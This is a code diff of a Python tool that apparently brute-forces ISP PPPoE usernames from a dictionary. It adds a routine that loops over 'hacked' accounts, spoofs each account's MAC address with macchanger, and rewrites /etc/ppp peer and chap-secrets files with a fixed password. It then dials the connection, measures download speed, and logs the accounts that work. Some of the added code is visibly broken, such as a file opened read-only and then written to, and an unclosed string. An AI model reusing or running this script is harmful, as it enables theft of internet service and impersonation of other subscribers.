@@ -1,4 +1,4 @@
-from os import path
+import os
 from ob_request import User
 from helper import *
 import multiprocessing as mp
@@ -6,6 +6,7 @@ from tqdm import *
 import speedtest
 
 TESTED = []
+dsl = 'noipdefault\ndefaultroute\nreplacedefaultroute\nhide-password\nnoauth\npersist\nplugin rp-pppoe.so eth0\nuser "{}"\nusepeerdns'
 
 
 def init(args):
@@ -28,7 +29,7 @@ def attack(username):
 def generate_username():
     dict_path = input('Enter the dictionary filepath: ')
 
-    if path.isfile(dict_path):
+    if os.path.isfile(dict_path):
         global TESTED
         TESTED = list(open('tested.txt', 'r'))
         usernames = list(open(dict_path, 'r'))
@@ -41,8 +42,37 @@ def generate_username():
         print('File not found')
 
 
+def test_speed():
+    s = speedtest.Speedtest()
+    s.get_servers()
+    s.get_best_server()
+    s.download()
+    res = s.results.dict()
+    return '{:.2f} MB/s'.format(res["download"] / 8000000)
+
+
 def test_username():
-    print('test')
+    for i in open('hacked.csv', 'r').readlines():
+        account = i.split(',')
+        os.system('poff')
+        os.system('ifconfig eth0 down')
+        os.system(f'macchanger -m {account[1]} eth0')
+        os.system('ifconfig eth0 up')
+        with open('/etc/ppp/peers/dsl-provider', 'w') as f:
+            f.write(dsl.format(account[0]))
+        with open('/etc/ppp/chap-secrets') as f:
+            f.write(f'"{account[0]}" * "1234')
+        os.system('pon dsl-provider')
+        retry = 5
+        connected = False
+        connected_account: str
+        while connected != True & retry > 0:
+            try:
+                speed = test_speed()
+                write('succesfull.csv', f'{i[:-1]},{speed}\n')
+                connected = True
+            except:
+                retry = retry - 1
 
 
 def switch_connection():
